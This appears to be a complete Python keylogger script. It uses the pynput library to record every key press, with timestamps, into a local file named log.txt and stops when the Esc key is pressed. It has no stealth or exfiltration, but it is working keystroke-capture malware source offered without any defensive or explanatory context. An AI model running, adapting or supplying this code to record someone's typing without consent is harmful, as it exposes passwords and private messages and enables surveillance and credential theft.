# import statements
import os
import logging
from pynput.keyboard import Key, Listener

# configure logging
logging.basicConfig(filename = ("log.txt"), level = logging.DEBUG, format = " %(asctime)s - %(message)s")

# write keystrokes into log file
def on_key_press(key):
	try:
		logging.info(str(key))
	except:
		print("Unable to find log file")

# create termination key
def on_release(key):
	if key == Key.esc:
		return False

# execute script
try:
	with Listener(on_press = on_key_press, on_release = on_release) as listener:
		listener.join()
except KeyboardInterrupt:
	exit()